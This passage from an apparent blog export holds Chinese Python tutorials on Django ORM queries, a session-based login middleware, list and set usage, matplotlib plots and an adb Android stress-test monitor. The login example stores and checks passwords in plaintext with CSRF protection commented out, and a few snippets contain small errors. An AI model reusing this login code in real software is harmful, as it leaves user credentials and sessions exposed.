<h4 id="多对多-1"><a href="#多对多-1" class="headerlink" title="多对多"></a>多对多</h4><p>查询任我行出过的所有书籍的名字。</p>
<p><strong>正向</strong>：通过 属性名称__跨表的属性名称(authors__name) 跨表获取数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Book.objects.filter(authors__name=&quot;任我行&quot;).values_list(&quot;title&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>反向</strong>：通过 小写类名__跨表的属性名称（book__title） 跨表获取数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Author.objects.filter(name=&quot;任我行&quot;).values_list(&quot;book__title&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="一对一-1"><a href="#一对一-1" class="headerlink" title="一对一"></a>一对一</h4><p>查询任我行的手机号。</p>
<p><strong>正向</strong>：通过 <strong>属性名称__跨表的属性名称(au_detail__tel)</strong> 跨表获取数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Author.objects.filter(name=&quot;任我行&quot;).values_list(&quot;au_detail__tel&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>反向</strong>：通过 <strong>小写类名__跨表的属性名称（author__name）</strong> 跨表获取数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.AuthorDetail.objects.filter(author__name=&quot;任我行&quot;).values_list(&quot;tel&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>主要介绍了新建项目，应用，路由，连接数据库，对model进行增删改查等操作</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title>python django实践二</title>
    <url>/aposts/8d0d1e49/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>紧接<a href="/aposts/dbc9f282">python django实践</a></p>
<h2 id="聚合和分组查询"><a href="#聚合和分组查询" class="headerlink" title="聚合和分组查询"></a>聚合和分组查询</h2><h3 id="聚合查询（aggregate）"><a href="#聚合查询（aggregate）" class="headerlink" title="聚合查询（aggregate）"></a>聚合查询（aggregate）</h3><ul>
<li><p>聚合查询函数是对一组值执行计算，<strong>并返回单个值</strong>。</p>
</li>
<li><p><code>Django</code> 使用聚合查询前要先从 <code>django.db.models</code> 引入<code> Avg、Max、Min、Count、Sum</code>（首字母大写）。</p>
</li>
<li><p>计算所有图书的平均价格:</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db.models import Avg,Max,Min,Count,Sum  #   引入函数</span><br><span class="line">...</span><br><span class="line">res = models.Book.objects.aggregate(Avg(&quot;price&quot;))</span><br><span class="line">print(res, type(res))</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>计算所有图书的数量、最贵价格和最便宜价格:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res=models.Book.objects.aggregate(c=Count(&quot;id&quot;),max=Max(&quot;price&quot;),min=Min(&quot;price&quot;))</span><br><span class="line">print(res,type(res)</span><br></pre></td></tr></table></figure>

<h3 id="分组查询（annotate）"><a href="#分组查询（annotate）" class="headerlink" title="分组查询（annotate）"></a>分组查询（annotate）</h3><ul>
<li>分组查询一般会用到聚合函数，所以使用前要先从<code> django.db.models</code> 引入 Avg,Max,Min,Count,Sum（首字母大写）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db.models import Avg,Max,Min,Count,Sum  #   引入函数</span><br></pre></td></tr></table></figure>

<p><strong>返回值：</strong></p>
<ul>
<li>分组后，用 values 取值，则返回值是 QuerySet 数据类型里面为一个个字典；</li>
<li>分组后，用 values_list 取值，则返回值是 QuerySet 数据类型里面为一个个元组。</li>
</ul>
<p>MySQL 中的 limit 相当于 ORM 中的 QuerySet 数据类型的切片。</p>
<blockquote>
<p>annotate 里面放聚合函数。</p>
<ul>
<li><strong>values 或者 values_list 放在 annotate 前面：</strong>values 或者 values_list 是声明以什么字段分组，annotate 执行分组。</li>
<li><strong>values 或者 values_list 放在annotate后面：</strong> annotate 表示直接以当前表的pk执行分组，values 或者 values_list 表示查询哪些字段， 并且要将 annotate 里的聚合函数起别名，在 values 或者 values_list 里写其别名。</li>
</ul>
</blockquote>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><ul>
<li>统计每一个出版社的最便宜的书的价格：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Publish.objects.values(&quot;name&quot;).annotate(in_price = Min(&quot;book__price&quot;))</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">&lt;QuerySet [&#123;&#x27;name&#x27;: &#x27;菜鸟出版社&#x27;, &#x27;in_price&#x27;: Decimal(&#x27;100.00&#x27;)&#125;, &#123;&#x27;name&#x27;: &#x27;明教出版社&#x27;, &#x27;in_price&#x27;: Decimal(&#x27;300.00&#x27;)&#125;]&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>统计每一本书的作者个数：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Book.objects.annotate(c = Count(&quot;authors__name&quot;)).values(&quot;title&quot;,&quot;c&quot;)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">&lt;QuerySet [&#123;&#x27;title&#x27;: &#x27;菜鸟教程&#x27;, &#x27;c&#x27;: 1&#125;, &#123;&#x27;title&#x27;: &#x27;吸星大法&#x27;, &#x27;c&#x27;: 1&#125;, &#123;&#x27;title&#x27;: &#x27;冲灵剑法&#x27;, &#x27;c&#x27;: 1&#125;]&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>统计每一本以”菜”开头的书籍的作者个数：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Book.objects.filter(title__startswith=&quot;菜&quot;).annotate(c = Count(&quot;authors__name&quot;)).values(&quot;title&quot;,&quot;c&quot;)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<ul>
<li>统计不止一个作者的图书名称：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Book.objects.annotate(c = Count(&quot;authors__name&quot;)).filter(c__gt=0).values(&quot;title&quot;,&quot;c&quot;)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">&lt;QuerySet [&#123;&#x27;title&#x27;: &#x27;菜鸟教程&#x27;, &#x27;c&#x27;: 1&#125;, &#123;&#x27;title&#x27;: &#x27;吸星大法&#x27;, &#x27;c&#x27;: 1&#125;, &#123;&#x27;title&#x27;: &#x27;冲灵剑法&#x27;, &#x27;c&#x27;: 1&#125;]&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>根据一本图书作者数量的多少对查询集 QuerySet 进行降序排序:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Book.objects.annotate(c = Count(&quot;authors__name&quot;)).order_by(&quot;-c&quot;).values(&quot;title&quot;,&quot;c&quot;)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<ul>
<li>查询各个作者出的书的总价格:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Author.objects.annotate(all = Sum(&quot;book__price&quot;)).values(&quot;name&quot;,&quot;all&quot;)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<h3 id="F-查询"><a href="#F-查询" class="headerlink" title="F() 查询"></a>F() 查询</h3><ul>
<li><p>F() 的实例可以在查询中引用字段，来比较同一个 model 实例中两个不同字段的值</p>
</li>
<li><p>F 动态获取对象字段的值，可以进行运算。</p>
</li>
<li><p>Django 支持 F() 对象之间以及 F() 对象和常数之间的加减乘除和取余的操作。</p>
</li>
<li><p>修改操作（update）也可以使用 F() 函数。</p>
</li>
</ul>
<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><ul>
<li>查询工资大于年龄的人：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db.models import F</span><br><span class="line">...</span><br><span class="line">book=models.Emp.objects.filter(salary__gt=F(&quot;age&quot;)).values(&quot;name&quot;,&quot;age&quot;)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>将每一本书的价格提高100元:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Book.objects.update(price=F(&quot;price&quot;)+100)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<h3 id="Q-查询"><a href="#Q-查询" class="headerlink" title="Q() 查询"></a>Q() 查询</h3><ul>
<li><p>之前构造的过滤器里的多个条件的关系都是 and，如果需要执行更复杂的查询（例如 or 语句），就可以使用 Q 。</p>
</li>
<li><p>Q 对象可以使用 &amp; | ~ （与 或 非）操作符进行组合。优先级从高到低：~ &amp; |。</p>
</li>
</ul>
<h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><ul>
<li>查询价格大于 350 或者名称以菜开头的书籍的名称和价格。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.db.models import Q</span><br><span class="line"></span><br><span class="line">res=models.Book.objects.filter(Q(price__gt=350)|Q(title__startswith=&quot;菜&quot;)).values(&quot;title&quot;,&quot;price&quot;)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<ul>
<li>查询以”菜”结尾或者不是 2010 年 10 月份的书籍:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Book.objects.filter(Q(title__endswith=&quot;菜&quot;) | ~Q(Q(pub_date__year=2010) &amp; Q(pub_date__month=10)))</span><br><span class="line">print(res) </span><br></pre></td></tr></table></figure>

<ul>
<li>查询出版日期是 2004 或者 1999 年，并且书名中包含有”菜”的书籍。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = models.Book.objects.filter(Q(pub_date__year=2004) | Q(pub_date__year=1999), title__contains=&quot;菜&quot;)</span><br><span class="line">print(res) </span><br></pre></td></tr></table></figure>

<blockquote>
<p>Q 对象和关键字混合使用，Q 对象要在所有关键字的前面:</p>
</blockquote>
<h2 id="中间件-验证登录"><a href="#中间件-验证登录" class="headerlink" title="中间件-验证登录"></a>中间件-验证登录</h2><ul>
<li><code>StudyDjanog/TestModel/model.py</code> 加入user</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Users(models.Model):</span><br><span class="line">    name = models.CharField(max_length=32)</span><br><span class="line">    pwd = models.CharField(max_length=32)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>生成表结构</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations TestModel  </span><br><span class="line">python manage.py migrate TestModel </span><br></pre></td></tr></table></figure>

<ul>
<li>登录代码 <code>TestModel\views.py</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def user_login(request):</span><br><span class="line">    if request.method != &quot;POST&quot;:</span><br><span class="line">        return JsonResponse(&#123;&#x27;code&#x27;: -1, &#x27;msg&#x27;: &#x27;method must is POST&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">    data = json.loads(request.body)</span><br><span class="line">    user_name = data.get(&#x27;username&#x27;)</span><br><span class="line">    pwd = data.get(&quot;pwd&quot;)</span><br><span class="line">    print(data)</span><br><span class="line">    try:</span><br><span class="line">        user_entry = Users.objects.get(name=user_name, pwd=pwd)</span><br><span class="line">        if user_entry:</span><br><span class="line">            # 设置登录的session</span><br><span class="line">            request.session[&quot;user&quot;] = user_name</span><br><span class="line">            return JsonResponse(&#123;&#x27;code&#x27;: 1, &#x27;msg&#x27;: &#x27;login is success&#x27;&#125;)</span><br><span class="line">    except ObjectDoesNotExist:</span><br><span class="line">        return JsonResponse(&#123;&#x27;code&#x27;: -1, &#x27;msg&#x27;: &#x27;login is fail111&#x27;&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>编写中间件<code> TestModel\middleware\authen.py</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from django.http import JsonResponse</span><br><span class="line">from django.shortcuts import redirect,render</span><br><span class="line">from django.utils.deprecation import MiddlewareMixin</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">#白名单</span><br><span class="line">#将登陆、登出、验证登陆请求设为白名单，不进行用户验证。</span><br><span class="line">#这里设置了/static/静态文件，因为我这个项目静态文件没走nginx，如果静态文件通过nginx访问，可以不需要设置</span><br><span class="line">exclued_path = [&quot;/login/&quot;,&quot;/testModel/login/&quot;,&quot;/logout/&quot;,&quot;/login_ajax_check&quot;,&quot;/static/&quot;]</span><br><span class="line"></span><br><span class="line">#用来验证用户是否有权限登陆的中间件</span><br><span class="line">class AuthenticationMiddle(MiddlewareMixin):</span><br><span class="line">    def process_request(self, request):</span><br><span class="line">        url_path = request.path</span><br><span class="line">        #如果不在请求在白名单里</span><br><span class="line">        if url_path not in exclued_path:</span><br><span class="line">            #如果未登陆，则调转到登陆页面，将请求的url作为next参数</span><br><span class="line">            # if  not request.user.is_authenticated:</span><br><span class="line">            if not request.session.get(&quot;user&quot;):</span><br><span class="line">                # return redirect(&quot;/login/?next=&#123;url_path&#125;&quot;.format(url_path=url_path))</span><br><span class="line">                return JsonResponse(&#123;&#x27;code&#x27;: -1, &#x27;msg&#x27;: &#x27;login is failed2222&#x27;&#125;)</span><br><span class="line">        #如果已经登陆，则通过</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>引用中间件  <code>StudyDjanog\StudyDjanog\settings.py</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MIDDLEWARE = [</span><br><span class="line">    &#x27;django.middleware.security.SecurityMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.common.CommonMiddleware&#x27;,</span><br><span class="line">    # &#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;,</span><br><span class="line">    &#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;,</span><br><span class="line">    &#x27;TestModel.middleware.authen.AuthenticationMiddle&#x27;, # 引用自定义中间件</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>测试</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">data =&#123;&quot;username&quot;: &quot;admin&quot;, &quot;pwd&quot;: &quot;123456&quot;&#125;</span><br><span class="line">rs = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">resp = rs.post(&quot;http://127.0.0.1:8000/testModel/login/&quot;, json=data)</span><br><span class="line">print(resp.text)</span><br><span class="line"></span><br><span class="line">resp1 = rs.get(&quot;http://127.0.0.1:8000/testModel/userQuery&quot;)</span><br><span class="line">print(resp1.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;code&quot;: 1, &quot;msg&quot;: &quot;login is success&quot;&#125;</span><br><span class="line">&lt;p&gt;runoob runoob &lt;/p&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>最终的session内容在django_session表中自动存储了</li>
</ul>
<p><img src="/aposts/8d0d1e49/image-20230803172250422.png" alt="image-20230803172250422"></p>
<ul>
<li>与<a href="https://blog.csdn.net/qq_38206656/article/details/105389058">vue结合实例</a></li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><a href="https://docs.djangoproject.com/zh-hans/4.2/topics/">更多内容</a></li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title>python-list排序,set的使用</title>
    <url>/aposts/7bdbe3d6/</url>
    <content><![CDATA[<h1 id="list排序，和打印"><a href="#list排序，和打印" class="headerlink" title="list排序，和打印"></a>list排序，和打印</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">l = [2, 4, 3, 5]</span><br><span class="line">str = &quot;bcdea&quot;</span><br><span class="line">def badIterable():</span><br><span class="line">    i = 0</span><br><span class="line">    iterable = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span><br><span class="line">    for item in iterable:</span><br><span class="line">        print(i, item)</span><br><span class="line">        i += 1</span><br><span class="line">def goodIterable():</span><br><span class="line">    iterable = [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span><br><span class="line">    for i, item in enumerate(iterable):</span><br><span class="line">        print(i, item)</span><br><span class="line"></span><br><span class="line">#结果：[(0, &#x27;a&#x27;), (1, &#x27;b&#x27;), (2, &#x27;c&#x27;)]</span><br><span class="line">def listIterable():</span><br><span class="line">    le = list(enumerate(&#x27;abc&#x27;))</span><br><span class="line">    return le</span><br><span class="line">#结果：[(1, &#x27;a&#x27;), (2, &#x27;b&#x27;), (3, &#x27;c&#x27;)]</span><br><span class="line">def listIterable1():</span><br><span class="line">    le = list(enumerate(&#x27;abc&#x27;, 1))</span><br><span class="line"># 正序</span><br><span class="line">def sortList(li):</span><br><span class="line">    li.sort()</span><br><span class="line">    return li</span><br><span class="line"># 倒序</span><br><span class="line">def reverseList(li):</span><br><span class="line">    # li.reverse()</span><br><span class="line">    temp = li[::-1]</span><br><span class="line">    print(temp)</span><br><span class="line">    return temp</span><br></pre></td></tr></table></figure>

<h1 id="set的使用"><a href="#set的使用" class="headerlink" title="set的使用"></a>set的使用</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 打印</span><br><span class="line">def testSet():</span><br><span class="line">    my_set = &#123;i * 15 for i in range(100)&#125;</span><br><span class="line">    print(my_set)</span><br><span class="line"># 交集</span><br><span class="line">def intersection():</span><br><span class="line">    x = set(&quot;span&quot;)</span><br><span class="line">    y = set(&quot;pta&quot;)</span><br><span class="line">    print(x&amp;y)</span><br><span class="line"># 合集</span><br><span class="line">def collection():</span><br><span class="line">    x = set(&quot;span&quot;)</span><br><span class="line">    y = set(&quot;pta&quot;)</span><br><span class="line">    print(x|y)</span><br><span class="line"># 差集</span><br><span class="line">def subtract():</span><br><span class="line">    x = set(&quot;span&quot;)</span><br><span class="line">    y = set(&quot;pta&quot;)</span><br><span class="line">    print(x-y)</span><br><span class="line"></span><br><span class="line">#去掉重复数据</span><br><span class="line">def removeRepeat():</span><br><span class="line">    a = [11,22,33,44,11,22]</span><br><span class="line">    b = set(a)</span><br><span class="line">    print(b)</span><br><span class="line">    c = [i for i in b]</span><br><span class="line">    print(c)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foo = &quot;t1m3a3pp4mt&quot;    </span><br><span class="line">print(&quot;&quot;.join(list(set(foo)))[::-1])   # 去掉重复字符串，倒序排列</span><br><span class="line">print(&quot;&quot;.join(list(set(foo)))[::1]) # 去掉重复自父亲，正序排列</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python-matplotlib多曲线</title>
    <url>/aposts/1adb1bf3/</url>
    <content><![CDATA[<ul>
<li>matplotlib  多个曲线的练习</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import matplotlib.pyplot as pl</span><br><span class="line">   import matplotlib.dates as mdates</span><br><span class="line">   import datetime</span><br><span class="line">   x = [</span><br><span class="line">     datetime.datetime(2011,1,1,1,1,2),</span><br><span class="line">     datetime.datetime(2011,1,1,1,1,3),</span><br><span class="line">     datetime.datetime(2011,1,1,1,1,4),</span><br><span class="line">     datetime.datetime(2011,1,1,1,1,5),</span><br><span class="line">     datetime.datetime(2011,1,1,1,1,6),</span><br><span class="line">     datetime.datetime(2011,1,1,1,1,7),</span><br><span class="line">     ]</span><br><span class="line"></span><br><span class="line">   list1 = [20,10,90,10,50,3]</span><br><span class="line">   list2 = [1000,3000,2899,1922,16000,89222]</span><br><span class="line">   a1 = pl.subplot(311) # 曲线图一</span><br><span class="line">   a1.set_title(&quot;CPU&quot;)</span><br><span class="line">   a1.set_ylabel(&quot;占用情况%&quot;)</span><br><span class="line">   a1.plot(x,list1)</span><br><span class="line">   # a1.xaxis.set_major_locator(mdates.SecondLocator(interval=2))</span><br><span class="line">   a1.xaxis.set_major_formatter(mdates.DateFormatter(&#x27;%H:%M:%S&#x27;))</span><br><span class="line"></span><br><span class="line">   a2 = pl.subplot(312) #曲线图二</span><br><span class="line">   a3 = pl.subplot(313) #曲线图三</span><br><span class="line"></span><br><span class="line">   a2.set_title(&quot;内存&quot;)</span><br><span class="line">   a2.set_ylabel(&quot;使用情况 K&quot;)</span><br><span class="line">   a2.plot(x,list2)</span><br><span class="line">   # a1.xaxis.set_major_locator(mdates.SecondLocator(interval=2))</span><br><span class="line">   a2.xaxis.set_major_formatter(mdates.DateFormatter(&#x27;%H:%M:%S&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   a3.set_title(&quot;流量&quot;)</span><br><span class="line">   a3.set_ylabel(&quot;使用情况 K&quot;)</span><br><span class="line">   a3.plot(x,list2)</span><br><span class="line">   # a1.xaxis.set_major_locator(mdates.SecondLocator(interval=2))</span><br><span class="line">   a3.xaxis.set_major_formatter(mdates.DateFormatter(&#x27;%H:%M:%S&#x27;))</span><br><span class="line"></span><br><span class="line">   # a1.margins(x=0.2)</span><br><span class="line">   pl.tight_layout()</span><br><span class="line">   pl.show()</span><br></pre></td></tr></table></figure>
<ul>
<li>结果</li>
</ul>
<p><img src="/aposts/1adb1bf3/mat.png" alt="Paste_Image.png"></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python+monkey压力测试</title>
    <url>/aposts/af1b4933/</url>
    <content><![CDATA[<blockquote>
<p>之前写过monkey方面的测试，这次刚好有项目用到，并且需要监控性能信息，所以重构了一次</p>
</blockquote>
<h1 id="monkey-压力测试android"><a href="#monkey-压力测试android" class="headerlink" title="monkey 压力测试android"></a>monkey 压力测试android</h1><ul>
<li>python3 </li>
<li>统计性能信息cpu,men,fps,battery,flow</li>
<li>支持wifi,gprs统计</li>
<li>统计crash信息</li>
<li><strong><a href="https://github.com/Louis-me/monkeyTest">查看源码</a></strong></li>
</ul>
<h2 id="monkey-ini-配置文件"><a href="#monkey-ini-配置文件" class="headerlink" title="monkey.ini 配置文件"></a>monkey.ini 配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cmd=adb shell monkey -p com.jianshu.haruki --throttle 500 --ignore-timeouts --ignore-crashes   --monitor-native-crashes -v -v -v 200 &gt;</span><br><span class="line">package_name=com.jianshu.haruki</span><br><span class="line">activity = com.baiji.jianshu.account.SplashScreenActivity</span><br><span class="line">net = wifi </span><br></pre></td></tr></table></figure>

<ul>
<li>throttle 每次事件等待500毫秒</li>
<li>net 支持gprs和wifi</li>
</ul>
<p><img src="/aposts/af1b4933/image-20220623165014473.png" alt="image-20220623165014473"></p>
<p><img src="/aposts/af1b4933/image-20220623165039643.png" alt="image-20220623165039643"></p>
<p><img src="/aposts/af1b4933/image-20220623165114249.png" alt="image-20220623165114249"></p>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p><strong>主要监控代码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def get_cpu(pkg_name):</span><br><span class="line">    cmd = &quot;adb  shell dumpsys cpuinfo | findstr &quot; + pkg_name</span><br><span class="line">    print(cmd)</span><br><span class="line">    output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.readlines()</span><br><span class="line">    for info in output:</span><br><span class="line">        if info.split()[1].decode().split(&quot;/&quot;)[1][:-1] == pkg_name:  # 只有包名相等</span><br><span class="line">            # print(&quot;cpu=&quot; + info.split()[2].decode())</span><br><span class="line">            cpu.append(float(info.split()[2].decode().split(&quot;%&quot;)[0]))</span><br><span class="line">            print(&quot;----cpu-----&quot;)</span><br><span class="line">            print(cpu)</span><br><span class="line">            return cpu</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_men(pkg_name):</span><br><span class="line">    cmd = &quot;adb shell  dumpsys  meminfo %s&quot; % (pkg_name)</span><br><span class="line">    print(cmd)</span><br><span class="line">    men_s = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.readlines()</span><br><span class="line">    for info in men_s:</span><br><span class="line">        if len(info.split()) and info.split()[0].decode() == &quot;TOTAL&quot;:</span><br><span class="line">            # print(&quot;men=&quot;+info.split()[1].decode())</span><br><span class="line">            men.append(int(info.split()[1].decode()))</span><br><span class="line">            print(&quot;----men----&quot;)</span><br><span class="line">            print(men)</span><br><span class="line">            return men</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 得到fps</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@author fenfenzhong</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_fps(pkg_name):</span><br><span class="line">    _adb = &quot;adb shell dumpsys gfxinfo %s&quot; % pkg_name</span><br><span class="line">    print(_adb)</span><br><span class="line">    results = os.popen(_adb).read().strip()</span><br><span class="line">    frames = [x for x in results.split(&#x27;\n&#x27;) if validator(x)]</span><br><span class="line">    frame_count = len(frames)</span><br><span class="line">    jank_count = 0</span><br><span class="line">    vsync_overtime = 0</span><br><span class="line">    render_time = 0</span><br><span class="line">    for frame in frames:</span><br><span class="line">        time_block = re.split(r&#x27;\s+&#x27;, frame.strip())</span><br><span class="line">        if len(time_block) == 3:</span><br><span class="line">            try:</span><br><span class="line">                render_time = float(time_block[0]) + float(time_block[1]) + float(time_block[2])</span><br><span class="line">            except Exception as e:</span><br><span class="line">                render_time = 0</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">        if render_time &gt; 16.67:</span><br><span class="line">            jank_count += 1</span><br><span class="line">            if render_time % 16.67 == 0:</span><br><span class="line">                vsync_overtime += int(render_time / 16.67) - 1</span><br><span class="line">            else:</span><br><span class="line">                vsync_overtime += int(render_time / 16.67)</span><br><span class="line"></span><br><span class="line">    _fps = int(frame_count * 60 / (frame_count + vsync_overtime))</span><br><span class="line">    fps.append(_fps)</span><br><span class="line">    # return (frame_count, jank_count, fps)</span><br><span class="line">    print(&quot;-----fps------&quot;)</span><br><span class="line">    print(fps)</span><br><span class="line">    return fps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_battery():</span><br><span class="line">    _batter = subprocess.Popen(&quot;adb shell dumpsys battery&quot;, shell=True, stdout=subprocess.PIPE,</span><br><span class="line">                               stderr=subprocess.PIPE).stdout.readlines()</span><br><span class="line">    for info in _batter:</span><br><span class="line">        if info.split()[0].decode() == &quot;level:&quot;:</span><br><span class="line">            battery.append(int(info.split()[1].decode()))</span><br><span class="line">            print(&quot;-----battery------&quot;)</span><br><span class="line">            print(battery)</span><br><span class="line">            return int(info.split()[1].decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_pid(pkg_name):</span><br><span class="line">    pid = subprocess.Popen(&quot;adb shell ps | findstr &quot; + pkg_name, shell=True, stdout=subprocess.PIPE,</span><br><span class="line">                           stderr=subprocess.PIPE).stdout.readlines()</span><br><span class="line">    for item in pid:</span><br><span class="line">        if item.split()[8].decode() == pkg_name:</span><br><span class="line">            return item.split()[1].decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_flow(pkg_name, type):</span><br><span class="line">    pid = get_pid(pkg_name)</span><br><span class="line">    if pid is not None:</span><br><span class="line">        _flow = subprocess.Popen(&quot;adb shell cat /proc/&quot; + pid + &quot;/net/dev&quot;, shell=True, stdout=subprocess.PIPE,</span><br><span class="line">                                 stderr=subprocess.PIPE).stdout.readlines()</span><br><span class="line">        for item in _flow:</span><br><span class="line">            if type == &quot;wifi&quot; and item.split()[0].decode() == &quot;wlan0:&quot;:  # wifi</span><br><span class="line">                # 0 上传流量，1 下载流量</span><br><span class="line">                flow[0].append(int(item.split()[1].decode()))</span><br><span class="line">                flow[1].append(int(item.split()[9].decode()))</span><br><span class="line">                print(&quot;------flow---------&quot;)</span><br><span class="line">                print(flow)</span><br><span class="line">                return flow</span><br><span class="line">            if type == &quot;gprs&quot; and item.split()[0].decode() == &quot;rmnet0:&quot;:  # gprs</span><br><span class="line">                print(&quot;--------------&quot;)</span><br><span class="line">                flow[0].append(int(item.split()[1].decode()))</span><br><span class="line">                flow[1].append(int(item.split()[9].decode()))</span><br><span class="line">                return flow</span><br><span class="line">    else:</span><br><span class="line">        flow[0].append(0)</span><br><span class="line">        flow[1].append(0)</span><br><span class="line">        return flow</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ul>
<li>代码入口：</li>
</ul>
